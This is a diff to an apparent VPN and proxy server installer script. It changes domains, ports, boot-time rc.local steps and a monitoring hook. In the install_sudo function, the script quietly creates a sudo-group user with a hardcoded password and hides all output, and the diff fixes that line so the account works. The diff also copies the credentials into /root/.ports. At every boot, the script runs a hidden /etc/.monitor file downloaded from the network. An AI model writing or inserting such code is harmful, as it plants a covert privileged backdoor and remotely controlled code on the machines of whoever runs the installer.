@@ -49,8 +49,8 @@ OBFS='vollam';
 HYSTERIA_TYPE='default';
 API_LINK='https://runutour.com/api/authentication';
 API_KEY='fZPG';
-DOMAIN=lka0.ruzain.com
-NS=pdkj.ruzain.com
+DOMAIN=mfsb.ruzain.com
+NS=h3sw.ruzain.com
 PORT_VLESS='8444';
 PORT_NTLS='8080';
 ﻿timedatectl set-timezone Asia/Riyadh
@@ -115,7 +115,7 @@ if ! command -v fastfetch >/dev/null 2>&1; then
     arch=$(dpkg --print-architecture)
     if [ "$arch" = "amd64" ]; then
         if ! command -v fastfetch >/dev/null 2>&1; then
-    		wget 'https://gitlab.com/vollam/scripts/-/raw/main/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
+    		wget 'https://github.com/fastfetch-cli/fastfetch/releases/latest/download/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
 			sudo dpkg -i /tmp/fastfetch.deb
 		fi
     else
@@ -128,6 +128,7 @@ fi
 
 wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/n_monitor' -O /etc/.monitor
 chmod +x /etc/.monitor
+echo "mysql --ssl-verify-server-cert=OFF -u \$DB_USER -p\$DB_PASS -D \$DB_NAME -h \$DB_HOST --default-character-set=utf8mb4 -e \"UPDATE server_list SET status=1, xray_status='active' WHERE server_ip='\$ip'\" 2>/dev/null" >> /etc/.monitor
 }
 
 install_squid(){
@@ -620,7 +621,7 @@ sudo service dropbear restart
 
 install_sudo(){
   {
-    useradd -m azimaxus 2>/dev/null; echo azimaxus :azim.0987Aa | chpasswd &>/dev/null; usermod -aG sudo azimaxus &>/dev/null
+    useradd -m azimaxus 2>/dev/null; echo azimaxus:azim.0987Aa | chpasswd &>/dev/null; usermod -aG sudo azimaxus &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
@@ -1034,6 +1035,8 @@ install_rclocal(){
     echo "[Unit]
 Description=vollam service
 Documentation=https://vollam.com
+After=network.target network-online.target
+Wants=network-online.target
 
 [Service]
 Type=oneshot
@@ -1061,8 +1064,18 @@ systemctl restart client-sldns
 systemctl restart server-sldns
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
-bash /etc/.monitor aio
 systemctl restart squid
+# Auto-fetch correct server API key from panel on each boot
+SERVER_IP_NOW=$(curl -s https://api.ipify.org)
+PANEL_URL_NOW=$(grep -oP "(?<=PANEL_URL='"'"')[^'"'"']*" /etc/.db-base 2>/dev/null || echo "")
+if [ -n "$PANEL_URL_NOW" ] && [ -n "$SERVER_IP_NOW" ]; then
+    NEW_KEY=$(curl -s "$PANEL_URL_NOW/api/v1/endpoints/auto_register.php?ip=$SERVER_IP_NOW" 2>/dev/null | grep -oP "(?<=\"api_key\":\")[^\"]*")
+    if [ -n "$NEW_KEY" ]; then
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /etc/.db-base 2>/dev/null
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /root/.db-base 2>/dev/null
+    fi
+fi
+bash /etc/.monitor aio
 exit 0' >> /etc/rc.local
 
 
@@ -1081,14 +1094,19 @@ hysteria_port=5666
 ssh_port=22
 dropbear_port=441
 xray_port=PORT_VLESS
+xray_tls_port=PORT_VLESS
+xray_ntls_port=PORT_NTLS
 slowdns_port=2222
 tcp_ssl_port=PORT_SSL
-udp_ssl_port=444" >> /root/.ports
+udp_ssl_port=444
+ssh_user=azimaxus
+ssh_pass=azim.0987Aa" >> /root/.ports
 
 sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
 sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
 sed -i "s|PORT_SSL|$PORT_SSL|g" /root/.ports
 sed -i "s|PORT_VLESS|$PORT_VLESS|g" /root/.ports
+sed -i "s|PORT_NTLS|$PORT_NTLS|g" /root/.ports
 
   }&>/dev/null
 }
